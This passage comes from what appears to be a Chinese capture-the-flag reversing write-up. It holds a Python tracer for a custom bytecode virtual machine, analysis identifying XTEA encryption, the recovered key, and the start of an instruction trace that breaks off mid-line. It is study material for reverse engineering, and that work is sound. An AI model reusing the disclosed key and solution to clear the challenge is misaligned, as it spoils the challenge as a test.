opc[reg[<span class="number">6</span>]] == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">assert</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">3</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: add reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">3</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">        reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = (reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span></span><br><span class="line">        reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">    <span class="comment"># shr</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: shr reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] &gt;&gt; memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, 作用: shr reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] &gt;&gt; opc[reg[<span class="number">6</span>]+<span class="number">3</span>]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">4</span></span><br><span class="line">    <span class="comment"># shl</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: shl reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = (reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] &lt;&lt; memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span></span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, 作用: shl reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = (reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] &lt;&lt; opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span></span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">4</span></span><br><span class="line">    <span class="comment"># cmp</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">9</span>:</span><br><span class="line">        BYTEPlace = ((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)%<span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: cmp (#<span class="subst">&#123;BYTEPlace&#125;</span>BYTE)memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>((memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]&amp;<span class="built_in">int</span>(<span class="string">&#x27;0xFF&#x27;</span>+<span class="string">&#x27;00&#x27;</span>*BYTEPlace,<span class="number">16</span>))&gt;&gt;BYTEPlace*<span class="number">8</span>)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]&amp;(<span class="number">0xFF</span>&lt;&lt;(BYTEPlace*<span class="number">8</span>)))&gt;&gt;BYTEPlace*<span class="number">8</span> == opc[reg[<span class="number">6</span>]+<span class="number">4</span>]:</span><br><span class="line">            reg[<span class="number">7</span>] = <span class="number">1</span></span><br><span class="line">            reg[<span class="number">8</span>] = reg[<span class="number">9</span>] = reg[<span class="number">10</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> (memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]&amp;(<span class="number">0xFF</span>&lt;&lt;(BYTEPlace*<span class="number">8</span>)))&gt;&gt;BYTEPlace*<span class="number">8</span> &gt; opc[reg[<span class="number">6</span>]+<span class="number">4</span>]:</span><br><span class="line">            reg[<span class="number">7</span>] = reg[<span class="number">8</span>] = reg[<span class="number">9</span>] = reg[<span class="number">10</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> (memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]&amp;(<span class="number">0xFF</span>&lt;&lt;(BYTEPlace*<span class="number">8</span>)))&gt;&gt;BYTEPlace*<span class="number">8</span> &lt; opc[reg[<span class="number">6</span>]+<span class="number">4</span>]:</span><br><span class="line">            reg[<span class="number">7</span>] = reg[<span class="number">10</span>] = <span class="number">0</span></span><br><span class="line">            reg[<span class="number">8</span>] = reg[<span class="number">9</span>] = <span class="number">1</span></span><br><span class="line">        reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">    <span class="comment"># jz(xmm[0])</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, 作用: jz(xmm[0]) <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>&quot;</span>,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> reg[<span class="number">7</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;此处跳转&quot;</span>)</span><br><span class="line">            reg[<span class="number">6</span>] = opc[reg[<span class="number">6</span>]+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> reg[<span class="number">7</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;此处未跳转&quot;</span>)</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">2</span></span><br><span class="line">    <span class="comment"># jmp</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">12</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, 作用: jmp <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>&quot;</span>)</span><br><span class="line">        reg[<span class="number">6</span>] = opc[reg[<span class="number">6</span>]+<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># and</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">13</span>:</span><br><span class="line">        <span class="keyword">if</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: and reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] &amp; memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, 作用: and reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>&quot;</span>)           </span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] &amp; opc[reg[<span class="number">6</span>]+<span class="number">3</span>]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">4</span></span><br><span class="line">    <span class="comment"># jnz(xmm[0])</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">15</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, 作用: jnz <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>&quot;</span>,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> reg[<span class="number">7</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;此处跳转&quot;</span>)</span><br><span class="line">            reg[<span class="number">6</span>] = opc[reg[<span class="number">6</span>]+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> reg[<span class="number">7</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;此处未跳转&quot;</span>)</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">2</span></span><br><span class="line">    <span class="comment"># nop</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">16</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;op: &#123;hex(opc[reg[6]])&#125;, 作用: nop&quot;</span>)</span><br><span class="line">        reg[<span class="number">6</span>] += <span class="number">1</span></span><br><span class="line">    <span class="comment"># wrong_length</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">17</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Length Wrong!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># mul</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">18</span>:</span><br><span class="line">        <span class="keyword">assert</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, 作用: mul reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">3</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">        reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = (reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]*opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span></span><br><span class="line">        reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">    <span class="comment"># je(xmm[1],xmm[3])</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">19</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, 作用: je(xmm[1],xmm[3]) <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>&quot;</span>,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> reg[<span class="number">8</span>] == reg[<span class="number">10</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;此处跳转&quot;</span>)</span><br><span class="line">            reg[<span class="number">6</span>] = opc[reg[<span class="number">6</span>]+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;此处未跳转&quot;</span>)</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">2</span></span><br><span class="line">    <span class="comment"># jz(xmm[2])</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">20</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, 作用: jz(xmm[2]) <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>&quot;</span>,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> reg[<span class="number">9</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;此处跳转&quot;</span>)</span><br><span class="line">            reg[<span class="number">6</span>] = opc[reg[<span class="number">6</span>]+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> reg[<span class="number">9</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;此处未跳转&quot;</span>)</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无法识别的字节码：&quot;</span>, opc[reg[<span class="number">6</span>]])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;memory:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(memory)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;memory[i]:#10x&#125;</span>&#x27;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (i%<span class="number">16</span> == <span class="number">15</span>):</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;reg:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(reg)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;reg[i]:#10x&#125;</span>&#x27;</span>, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">    <span class="comment"># time.sleep(0.001)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;result[i]:#10x&#125;</span>&#x27;</span>, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
<p>分析输出的指令流，发现先进行了一个类似于strlen的函数求了字符串的长度，如果不是0x20就退出程序，然后加载密钥到内存区域，随后将密文按两个dword一组（共计4组，8个dword，32字节）进行加密，每组加密循环0x30（48）轮，并且通过分析发现了很强的XTEA特征，同时还发现了标志性的4个dword构成的密钥<font color=red><strong>[0x766F6843, 0x6E695F79, 0x5F79656Bh, 0x5F363377]</strong></font>：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">op <span class="number">318</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0xfffffff8</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">2</span>] = <span class="number">0xa4</span>, memory[<span class="number">59</span>] = <span class="number">0x0</span></span><br><span class="line">op <span class="number">323</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xffffffe0</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">3</span>] = <span class="number">0x5f363377</span>, memory[<span class="number">53</span>] = <span class="number">0x200</span></span><br><span class="line">op <span class="number">328</span>: <span class="number">0x2</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">0</span>] = <span class="number">0xc</span>, memory[<span class="number">128</span>] = <span class="number">0x34333231</span></span><br><span class="line">op <span class="number">334</span>: <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xffffffec</span>, <span class="number">0x0</span>, 作用: <span class="keyword">mov</span> memory[<span class="number">56</span>] = <span class="number">0x0</span>, reg[<span class="number">0</span>] = <span class="number">0x34333231</span></span><br><span class="line">op <span class="number">339</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0xfffffff8</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">2</span>] = <span class="number">0x0</span>, memory[<span class="number">59</span>] = <span class="number">0x0</span></span><br><span class="line">op <span class="number">344</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xffffffe0</span>, 作用: 